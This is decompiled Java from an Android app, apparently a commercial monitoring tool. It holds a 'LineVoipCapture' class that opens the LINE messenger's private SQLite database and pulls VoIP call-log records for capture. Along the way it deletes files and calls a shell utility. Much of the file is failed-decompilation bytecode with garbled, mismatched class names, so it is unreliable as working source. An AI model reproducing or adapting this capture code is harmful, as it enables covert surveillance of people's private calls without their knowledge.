package com.vvt.al.c;

import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import android.util.Pair;
import com.vvt.ag.b;
import com.vvt.capture.c.m;
import java.io.File;

public class c
  extends com.vvt.al.a
  implements com.vvt.al.c
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  private com.vvt.h.d e;
  
  public c(String paramString1, String paramString2, com.vvt.h.d paramd, com.vvt.base.a parama)
  {
    super(paramString1, paramString2, parama);
    this.e = paramd;
  }
  
  private com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = c;
    if (bool1) {}
    Object localObject = this.b;
    String str = this.a;
    localObject = com.vvt.capture.c.c.a(paramSQLiteDatabase, (String)localObject, str);
    boolean bool2 = c;
    if (bool2) {}
    str = ((com.vvt.im.events.info.d)localObject).g();
    boolean bool3 = b.a(str);
    if (!bool3)
    {
      File localFile = new java/io/File;
      localFile.<init>(str);
      localFile.delete();
      bool2 = false;
      str = null;
      ((com.vvt.im.events.info.d)localObject).f(null);
    }
    bool2 = c;
    if (bool2) {}
    return (com.vvt.im.events.info.d)localObject;
  }
  
  /* Error */
  private void a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: getstatic 18	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   5: istore 4
    //   7: iload 4
    //   9: ifeq +3 -> 12
    //   12: invokestatic 66	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	()Ljava/lang/String;
    //   15: astore 5
    //   17: aload_2
    //   18: invokestatic 71	com/vvt/capture/MyUncaughtExceptionHandler/a/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   21: astore 6
    //   23: aload 6
    //   25: ifnull +183 -> 208
    //   28: iconst_0
    //   29: istore 7
    //   31: aconst_null
    //   32: astore 8
    //   34: aload 6
    //   36: aload 5
    //   38: aconst_null
    //   39: invokevirtual 77	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   42: astore 8
    //   44: aload 8
    //   46: ifnull +335 -> 381
    //   49: aload_0
    //   50: getfield 28	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:e	Lcom/vvt/AppEngine1/d;
    //   53: astore 5
    //   55: aload 8
    //   57: aload 5
    //   59: invokestatic 80	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	(Landroid/database/Cursor;Lcom/vvt/AppEngine1/d;)Ljava/util/ArrayList;
    //   62: astore 5
    //   64: aload 5
    //   66: invokevirtual 86	java/util/ArrayList:size	()I
    //   69: istore 9
    //   71: iload 9
    //   73: ifle +116 -> 189
    //   76: iconst_0
    //   77: istore 9
    //   79: aload 5
    //   81: iconst_0
    //   82: invokevirtual 90	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   85: astore 5
    //   87: aload 5
    //   89: checkcast 92	com/vvt/capture/MyUncaughtExceptionHandler/a
    //   92: astore 5
    //   94: aload_0
    //   95: aload 6
    //   97: invokespecial 95	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	(Landroid/database/sqlite/SQLiteDatabase;)Lcom/vvt/im/events/info/d;
    //   100: astore 10
    //   102: aload 5
    //   104: astore_3
    //   105: aload 10
    //   107: astore 5
    //   109: aload 5
    //   111: astore 10
    //   113: aload_3
    //   114: astore 5
    //   116: aload 10
    //   118: astore_3
    //   119: aload 8
    //   121: ifnull +10 -> 131
    //   124: aload 8
    //   126: invokeinterface 101 1 0
    //   131: aload 6
    //   133: ifnull +8 -> 141
    //   136: aload 6
    //   138: invokevirtual 102	android/database/sqlite/SQLiteDatabase:close	()V
    //   141: aload 5
    //   143: ifnull +35 -> 178
    //   146: aload_3
    //   147: ifnull +31 -> 178
    //   150: aload_0
    //   151: aload 5
    //   153: invokevirtual 105	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/info/ICallLogData;)Z
    //   156: istore 7
    //   158: iload 7
    //   160: ifeq +156 -> 316
    //   163: getstatic 111	com/vvt/events/FxVoipCategory:LINE	Lcom/vvt/events/FxVoipCategory;
    //   166: astore 8
    //   168: aload_0
    //   169: aload_1
    //   170: aload 5
    //   172: aload_3
    //   173: aload 8
    //   175: invokevirtual 114	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/info/ICallLogData;Lcom/vvt/im/events/info/d;Lcom/vvt/events/FxVoipCategory;)V
    //   178: getstatic 18	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   181: istore 4
    //   183: iload 4
    //   185: ifeq +3 -> 188
    //   188: return
    //   189: getstatic 22	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:d	Z
    //   192: istore 4
    //   194: iload 4
    //   196: ifeq +3 -> 199
    //   199: iconst_0
    //   200: istore 4
    //   202: aconst_null
    //   203: astore 5
    //   205: goto -96 -> 109
    //   208: getstatic 22	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:d	Z
    //   211: istore 4
    //   213: iload 4
    //   215: ifeq +3 -> 218
    //   218: iconst_0
    //   219: istore 4
    //   221: aconst_null
    //   222: astore 5
    //   224: iconst_0
    //   225: istore 7
    //   227: aconst_null
    //   228: astore 8
    //   230: goto -111 -> 119
    //   233: astore 5
    //   235: iconst_0
    //   236: istore 4
    //   238: aconst_null
    //   239: astore 5
    //   241: iconst_0
    //   242: istore 7
    //   244: aconst_null
    //   245: astore 8
    //   247: aconst_null
    //   248: astore 6
    //   250: getstatic 22	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:d	Z
    //   253: istore 9
    //   255: iload 9
    //   257: ifeq +3 -> 260
    //   260: aload 8
    //   262: ifnull +10 -> 272
    //   265: aload 8
    //   267: invokeinterface 101 1 0
    //   272: aload 6
    //   274: ifnull -133 -> 141
    //   277: goto -141 -> 136
    //   280: astore 5
    //   282: iconst_0
    //   283: istore 7
    //   285: aconst_null
    //   286: astore 8
    //   288: aconst_null
    //   289: astore 6
    //   291: aload 8
    //   293: ifnull +10 -> 303
    //   296: aload 8
    //   298: invokeinterface 101 1 0
    //   303: aload 6
    //   305: ifnull +8 -> 313
    //   308: aload 6
    //   310: invokevirtual 102	android/database/sqlite/SQLiteDatabase:close	()V
    //   313: aload 5
    //   315: athrow
    //   316: getstatic 18	com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   319: istore 4
    //   321: iload 4
    //   323: ifeq +3 -> 326
    //   326: aload_1
    //   327: invokestatic 119	com/vvt/shell/ShellUtil:i	(Ljava/lang/String;)V
    //   330: goto -152 -> 178
    //   333: astore 5
    //   335: iconst_0
    //   336: istore 7
    //   338: aconst_null
    //   339: astore 8
    //   341: goto -50 -> 291
    //   344: astore 5
    //   346: goto -55 -> 291
    //   349: astore 5
    //   351: iconst_0
    //   352: istore 4
    //   354: aconst_null
    //   355: astore 5
    //   357: iconst_0
    //   358: istore 7
    //   360: aconst_null
    //   361: astore 8
    //   363: goto -113 -> 250
    //   366: astore 5
    //   368: iconst_0
    //   369: istore 4
    //   371: aconst_null
    //   372: astore 5
    //   374: goto -124 -> 250
    //   377: pop
    //   378: goto -128 -> 250
    //   381: iconst_0
    //   382: istore 4
    //   384: aconst_null
    //   385: astore 5
    //   387: goto -268 -> 119
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	390	0	this	MyUncaughtExceptionHandler
    //   0	390	1	paramString1	String
    //   0	390	2	paramString2	String
    //   1	172	3	localObject1	Object
    //   5	378	4	bool1	boolean
    //   15	208	5	localObject2	Object
    //   233	1	5	localException1	Exception
    //   239	1	5	localObject3	Object
    //   280	34	5	localObject4	Object
    //   333	1	5	localObject5	Object
    //   344	1	5	localObject6	Object
    //   349	1	5	localException2	Exception
    //   355	1	5	localObject7	Object
    //   366	1	5	localException3	Exception
    //   372	14	5	localObject8	Object
    //   21	288	6	localSQLiteDatabase	SQLiteDatabase
    //   29	330	7	bool2	boolean
    //   32	330	8	localObject9	Object
    //   69	9	9	i	int
    //   253	3	9	bool3	boolean
    //   100	17	10	localObject10	Object
    //   377	1	21	localException4	Exception
    // Exception table:
    //   from	to	target	type
    //   17	21	233	java/lang/Exception
    //   17	21	280	finally
    //   38	42	333	finally
    //   208	211	333	finally
    //   49	53	344	finally
    //   57	62	344	finally
    //   64	69	344	finally
    //   81	85	344	finally
    //   87	92	344	finally
    //   95	100	344	finally
    //   189	192	344	finally
    //   250	253	344	finally
    //   38	42	349	java/lang/Exception
    //   208	211	349	java/lang/Exception
    //   49	53	366	java/lang/Exception
    //   57	62	366	java/lang/Exception
    //   64	69	366	java/lang/Exception
    //   81	85	366	java/lang/Exception
    //   87	92	366	java/lang/Exception
    //   189	192	366	java/lang/Exception
    //   95	100	377	java/lang/Exception
  }
  
  private Pair f()
  {
    boolean bool1 = c;
    if (bool1) {}
    Object localObject1 = m.a();
    boolean bool2 = b.a((String)localObject1);
    Object localObject2;
    if (!bool2)
    {
      localObject2 = this.b;
      String str1 = "voip_line";
      String str2 = this.a;
      localObject1 = m.a((String)localObject1, (String)localObject2, str1, str2);
      bool2 = b.a((String)localObject1);
      if (bool2) {
        break label90;
      }
      bool2 = c;
      if (bool2) {}
      bool2 = true;
      localObject2 = Boolean.valueOf(bool2);
    }
    for (localObject1 = Pair.create(localObject2, localObject1);; localObject1 = Pair.create(localObject1, null))
    {
      return (Pair)localObject1;
      bool1 = d;
      if (bool1) {}
      label90:
      bool1 = c;
      if (bool1) {}
      bool1 = false;
      localObject1 = Boolean.valueOf(false);
      bool2 = false;
      localObject2 = null;
    }
  }
  
  public String a()
  {
    return "voip_line";
  }
  
  public void a(String paramString, long paramLong)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    long l = 10000L;
    SystemClock.sleep(l);
    Pair localPair = f();
    Object localObject = (Boolean)localPair.first;
    bool = ((Boolean)localObject).booleanValue();
    if (bool)
    {
      localObject = (String)localPair.second;
      a(paramString, (String)localObject);
    }
    d();
    bool = c;
    if (bool) {}
  }
  
  public String b()
  {
    return "LineVoipCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */